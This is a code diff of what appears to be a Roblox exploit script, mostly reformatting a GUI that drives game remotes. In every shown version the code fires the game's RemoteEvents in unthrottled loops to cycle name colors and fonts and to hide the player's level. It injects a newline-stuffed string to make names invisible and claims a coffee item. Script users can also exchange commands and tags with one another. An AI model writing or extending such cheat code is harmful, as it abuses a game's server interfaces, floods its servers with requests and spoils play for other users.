-		if Action == "TagTargetStatus" then
-			if Data == true then
-				Notify("🟢 You can use this cmd on this player.", "Left")
-			else
-				Notify("This person is not using the script so you can't use this cmd on them.", "Left")
-			end
-			return
-		end
-
-		if Action == "CommandResult" then
-			if typeof(Data) == "string" then
-				Notify(Data, "Left")
-			end
-			return
-		end
-
-		if Action == "TagSet" then
-			local Target = Players:GetPlayerByUserId(TargetUserId)
-			if Target then
-				CustomTags[TargetUserId] = tostring(Data)
-				MakeCustomTag(Target, tostring(Data))
-				Notify("🏷️ Custom tag set", "Left")
-			end
-			return
-		end
-
-		if Action == "TagRemoved" then
-			CustomTags[TargetUserId] = nil
-			local Target = Players:GetPlayerByUserId(TargetUserId)
-			if Target then
-				RemoveTag(Target, CUSTOM_TAG)
-			end
-			Notify("🏷️ Custom tag removed", "Left")
-			return
-		end
-	end)
+    CommandRemote.OnClientEvent:Connect(function(Action, TargetUserId, Data)
+        if Action == "Alert" then
+            ShowGlobalAlert(tostring(Data)); return
+        end
+        if Action == "TagTargetStatus" then
+            if Data == true then
+                Notify("🟢 You can use this cmd on this player.", "Left")
+            else
+                Notify("This person is not using the script so you can't use this cmd on them.", "Left")
+            end
+            return
+        end
+        if Action == "CommandResult" and typeof(Data) == "string" then
+            Notify(Data, "Left"); return
+        end
+        if Action == "TagSet" then
+            local Target = Players:GetPlayerByUserId(TargetUserId)
+            if Target then
+                CustomTags[TargetUserId] = tostring(Data)
+                MakeCustomTag(Target, tostring(Data))
+                Notify("🏷️ Custom tag set", "Left")
+            end
+            return
+        end
+        if Action == "TagRemoved" then
+            CustomTags[TargetUserId] = nil
+            local Target = Players:GetPlayerByUserId(TargetUserId)
+            if Target then RemoveTag(Target, CUSTOM_TAG) end
+            Notify("🏷️ Custom tag removed", "Left")
+            return
+        end
+    end)
 end)
 
 --//======================================================
---// NAME COLOR REMOTE
+--// === NAME COLOR REMOTE (VERBATIM FROM ORIGINAL) ===
 --//======================================================
-
 task.spawn(function()
-	Event = ReplicatedStorage:WaitForChild(REMOTE_NAME, 10)
+    Event = ReplicatedStorage:WaitForChild(REMOTE_NAME, 10)
 end)
 
 local function SendColor(Color)
-	if not Event then return end
-	pcall(function()
-		Event:FireServer("colo", Color)
-	end)
+    if not Event then return end
+    pcall(function()
+        Event:FireServer("colo", Color)
+    end)
 end
 
 local function StartNameColor()
-	task.spawn(function()
-		while NameColorEnabled do
-			if RequestCount >= REQUEST_LIMIT then break end
+    task.spawn(function()
+        while NameColorEnabled do
+            if RequestCount >= REQUEST_LIMIT then break end
 
-			SendColor(Colors[ColorIndex])
-			ColorIndex = ColorIndex % #Colors + 1
-			RequestCount += 1
-			Status.Text = "Requests: " .. RequestCount
+            SendColor(NameColorSource[ColorIndex])
+            ColorIndex = ColorIndex % #NameColorSource + 1
+            RequestCount += 1
+            Footer.Text = "Requests: " .. RequestCount
 
-			if DELAY > 0 then task.wait(DELAY) else task.wait() end
-		end
-	end)
+            if DELAY > 0 then task.wait(DELAY) else task.wait() end
+        end
+    end)
 end
 
 --//======================================================
 --// FONT CHANGER
 --//======================================================
-
-local function SendFont(Font)
-	if not Event then return end
-	pcall(function()
-		Event:FireServer("font", Font)
-	end)
+local function SendFont(f)
+    if not Event then return end
+    pcall(function() Event:FireServer("font", f) end)
 end
 
 local function StartFontChanger()
-	task.spawn(function()
-		while FontChangerEnabled do
-			SendFont(Fonts[FontIndex])
-			FontIndex = FontIndex % #Fonts + 1
-			if DELAY > 0 then task.wait(DELAY) else task.wait() end
-		end
-	end)
+    task.spawn(function()
+        while FontChangerEnabled do
+            SendFont(Fonts[FontIndex])
+            FontIndex = FontIndex % #Fonts + 1
+            if DELAY > 0 then task.wait(DELAY) else task.wait() end
+        end
+    end)
 end
 
 --//======================================================
 --// FAST LVL HIDER
 --//======================================================
-
 task.spawn(function()
-	FastLvlHiderEvent = ReplicatedStorage:WaitForChild(FAST_LVL_HIDER_REMOTE_NAME, 10)
+    FastLvlHiderEvent = ReplicatedStorage:WaitForChild(FAST_LVL_HIDER_REMOTE_NAME, 10)
 end)
 
 FastLvlHiderButton.MouseButton1Click:Connect(function()
-	FastLvlHiderEnabled = not FastLvlHiderEnabled
-
-	if FastLvlHiderEnabled then
-		FastLvlHiderButton.Text = "FAST LVL HIDER: ON"
-		task.spawn(function()
-			while FastLvlHiderEnabled do
-				if FastLvlHiderEvent then
-					FastLvlHiderEvent:FireServer(3)
-					FastLvlHiderEvent:FireServer(4)
-				end
-				task.wait()
-			end
-		end)
-	else
-		FastLvlHiderButton.Text = "FAST LVL HIDER: OFF"
-	end
+    FastLvlHiderEnabled = not FastLvlHiderEnabled
+    SetToggleVisual(FastLvlHiderButton, FastLvlHiderEnabled)
+    if FastLvlHiderEnabled then
+        FastLvlHiderButton.Text = "Fast Lvl Hider  •  ON"
+        task.spawn(function()
+            while FastLvlHiderEnabled do
+                if FastLvlHiderEvent then
+                    FastLvlHiderEvent:FireServer(3)
+                    FastLvlHiderEvent:FireServer(4)
+                end
+                task.wait()
+            end
+        end)
+    else
+        FastLvlHiderButton.Text = "Fast Lvl Hider"
+    end
 end)
 
 --//======================================================
---// NAME COLOR
+--// NAME COLOR BUTTON
 --//======================================================
-
 NameColorButton.MouseButton1Click:Connect(function()
-	if FontChangerEnabled then
-		Notify("CAN'T USE BOTH AT SAME TIME", "Left")
-		return
-	end
-
-	NameColorEnabled = not NameColorEnabled
-
-	if NameColorEnabled then
-		NameColorButton.Text = "NAME COLOR: ON"
-		RequestCount = 0
-		Status.Text = "Requests: 0"
-		StartNameColor()
-	else
-		NameColorButton.Text = "NAME COLOR: OFF"
-		RequestCount = 0
-		Status.Text = "Requests: 0"
-	end
+    if FontChangerEnabled then
+        Notify("CAN'T USE BOTH AT SAME TIME", "Left")
+        return
+    end
+    NameColorEnabled = not NameColorEnabled
+    SetToggleVisual(NameColorButton, NameColorEnabled)
+    if NameColorEnabled then
+        NameColorButton.Text = "Name Color  •  ON"
+        RequestCount = 0
+        Footer.Text = "Requests: 0"
+        StartNameColor()
+    else
+        NameColorButton.Text = "Name Color"
+        RequestCount = 0
+        Footer.Text = "Requests: 0"
+    end
 end)
 
 --//======================================================
---// FONT
+--// FONT BUTTON
 --//======================================================
-
 FontButton.MouseButton1Click:Connect(function()
-	if NameColorEnabled then
-		Notify("CAN'T USE BOTH AT SAME TIME", "Left")
-		return
-	end
-
-	FontChangerEnabled = not FontChangerEnabled
-
-	if FontChangerEnabled then
-		FontButton.Text = "FONT CHANGER: ON"
-		StartFontChanger()
-	else
-		FontButton.Text = "FONT CHANGER: OFF"
-	end
+    if NameColorEnabled then
+        Notify("CAN'T USE BOTH AT SAME TIME", "Left")
+        return
+    end
+    FontChangerEnabled = not FontChangerEnabled
+    SetToggleVisual(FontButton, FontChangerEnabled)
+    if FontChangerEnabled then
+        FontButton.Text = "Font Changer  •  ON"
+        StartFontChanger()
+    else
+        FontButton.Text = "Font Changer"
+    end
 end)
 
 --//======================================================
 --// INVISIBLE NAME
 --//======================================================
-
 InvisibleNameButton.MouseButton1Click:Connect(function()
-	if InvisibleNameClicks >= 6 then
-		Notify("INVISIBLE NAME: 6 CLICKS USED", "Left")
-		return
-	end
-
-	if Event then
-		pcall(function()
-			Event:FireServer("upd", "y\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny")
-		end)
-
-		InvisibleNameClicks += 1
-		InvisibleNameButton.Text = "INVISIBLE NAME: " .. InvisibleNameClicks .. "/6"
-	end
+    if InvisibleNameClicks >= 6 then
+        Notify("INVISIBLE NAME: 6 CLICKS USED", "Left")
+        return
+    end
+    if Event then
+        pcall(function()
+            Event:FireServer("upd", "y\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ny")
+        end)
+        InvisibleNameClicks += 1
+        InvisibleNameButton.Text = "Invisible Name  [" .. InvisibleNameClicks .. "/6]"
+        if InvisibleNameClicks == 6 then
+            SetToggleVisual(InvisibleNameButton, true)
+        end
+    end
 end)
 
 --//======================================================
 --// COFFEE
 --//======================================================
-
 CoffeeButton.MouseButton1Click:Connect(function()
-	if CoffeeClicked then
-		Notify("YOU CAN ONLY CLICK ONE TIME", "Left")
-		return
-	end
-
-	local CoffeeEvent = ReplicatedStorage:FindFirstChild(COFFEE_REMOTE_NAME)
-	if not CoffeeEvent then
-		Notify("COFFEE REMOTE NOT FOUND", "Left")
-		return
-	end
-
-	pcall(function()
-		CoffeeEvent:FireServer(2, "Coffee")
-	end)
-
-	CoffeeClicked = true
-	CoffeeButton.Text = "☕ GET COFFEE: USED"
+    if CoffeeClicked then
+        Notify("YOU CAN ONLY CLICK ONE TIME", "Left")
+        return
+    end
+    local CoffeeEvent = ReplicatedStorage:FindFirstChild(COFFEE_REMOTE_NAME)
+    if not CoffeeEvent then
+        Notify("COFFEE REMOTE NOT FOUND", "Left")
+        return
+    end
+    pcall(function() CoffeeEvent:FireServer(2, "Coffee") end)
+    CoffeeClicked = true
+    SetToggleVisual(CoffeeButton, true)
+    CoffeeButton.Text = "☕  Coffee Claimed"
 end)
 
 --//======================================================
 --// DISCORD
 --//======================================================
-
 DiscordButton.MouseButton1Click:Connect(function()
-	if typeof(setclipboard) ~= "function" then return end
-
-	pcall(function()
-		setclipboard(DISCORD_LINK)
-	end)
-
-	DiscordButton.Text = "✓ COPIED"
-	task.delay(2, function()
-		if DiscordButton.Parent then
-			DiscordButton.Text = "☁ JOIN DISCORD"
-		end
-	end)
+    if typeof(setclipboard) ~= "function" then return end
+    pcall(function() setclipboard(DISCORD_LINK) end)
+    DiscordButton.Text = "✓  Copied to Clipboard"
+    SetToggleVisual(DiscordButton, true)
+    task.delay(2, function()
+        if DiscordButton.Parent then
+            DiscordButton.Text = "☁  Join Discord"
+            SetToggleVisual(DiscordButton, false)
+        end
+    end)
 end)
 
 --//======================================================
---// DRAG (MAIN + SECRET)
+--// DRAG
 --//======================================================
-
 local function MakeDraggable(Object)
-	local Dragging = false
-	local DragStart
-	local StartPosition
+    local Dragging = false
+    local DragStart, StartPosition
 
-	Object.InputBegan:Connect(function(Input)
-		if Input.UserInputType == Enum.UserInputType.MouseButton1
-			or Input.UserInputType == Enum.UserInputType.Touch then
-			Dragging = true
-			DragStart = Input.Position
-			StartPosition = Object.Position
+    Object.InputBegan:Connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseButton1
+            or Input.UserInputType == Enum.UserInputType.Touch then
+            Dragging = true
+            DragStart = Input.Position
+            StartPosition = Object.Position
+            Input.Changed:Connect(function()
+                if Input.UserInputState == Enum.UserInputState.End then
+                    Dragging = false
+                end
+            end)
+        end
+    end)
 
-			Input.Changed:Connect(function()
-				if Input.UserInputState == Enum.UserInputState.End then
-					Dragging = false
-				end
-			end)
-		end
-	end)
-
-	UserInputService.InputChanged:Connect(function(Input)
-		if not Dragging then return end
-		if Input.UserInputType ~= Enum.UserInputType.MouseMovement
-			and Input.UserInputType ~= Enum.UserInputType.Touch then return end
-
-		local Delta = Input.Position - DragStart
-		Object.Position = UDim2.new(
-			StartPosition.X.Scale, StartPosition.X.Offset + Delta.X,
-			StartPosition.Y.Scale, StartPosition.Y.Offset + Delta.Y
-		)
-	end)
+    UserInputService.InputChanged:Connect(function(Input)
+        if not Dragging then return end
+        if Input.UserInputType ~= Enum.UserInputType.MouseMovement
+            and Input.UserInputType ~= Enum.UserInputType.Touch then return end
+        local Delta = Input.Position - DragStart
+        Object.Position = UDim2.new(
+            StartPosition.X.Scale, StartPosition.X.Offset + Delta.X,
+            StartPosition.Y.Scale, StartPosition.Y.Offset + Delta.Y
+        )
+    end)
 end
 
 MakeDraggable(Main)
@@ -1192,41 +1193,36 @@ MakeDraggable(OpenButton)
 if SecretPanel then MakeDraggable(SecretPanel) end
 
 --//======================================================
---// PLAYER ADDED / REMOVING
+--// PLAYER JOIN / LEAVE
 --//======================================================
-
 Players.PlayerAdded:Connect(function(Target)
-	SetupPlayer(Target)
-
-	if Target.Name == OWNER_USERNAME then
-		Notify("👑 Owner of script joined the server", "Left")
-	elseif Target.Name == CO_OWNER_USERNAME then
-		Notify("👑 Co Owner has joined the server", "Right")
-	end
-
-	task.wait(0.5)
-	UpdateTags()
+    SetupPlayer(Target)
+    if Target.Name == OWNER_USERNAME then
+        Notify("👑 Owner of script joined the server", "Left")
+    elseif Target.Name == CO_OWNER_USERNAME then
+        Notify("👑 Co Owner has joined the server", "Right")
+    end
+    task.wait(0.5)
+    UpdateTags()
 end)
 
 Players.PlayerRemoving:Connect(function(Target)
-	RegisteredPlayers[Target.UserId] = nil
-	CustomTags[Target.UserId] = nil
-	UpdateTags()
+    RegisteredPlayers[Target.UserId] = nil
+    CustomTags[Target.UserId] = nil
+    UpdateTags()
 end)
 
 --//======================================================
---// INITIAL UPDATE
+--// INIT
 --//======================================================
-
 task.defer(function()
-	task.wait(0.1)
-	UpdateTags()
-
-	if IsOwner then
-		Notify("👑 Owner of script joined the server", "Left")
-	elseif IsCoOwner then
-		Notify("👑 Co Owner joined the server", "Right")
-	end
+    task.wait(0.1)
+    UpdateTags()
+    if IsOwner then
+        Notify("👑 Owner of script joined the server", "Left")
+    elseif IsCoOwner then
+        Notify("👑 Co Owner joined the server", "Right")
+    end
 end)
 
 Main.Visible = true
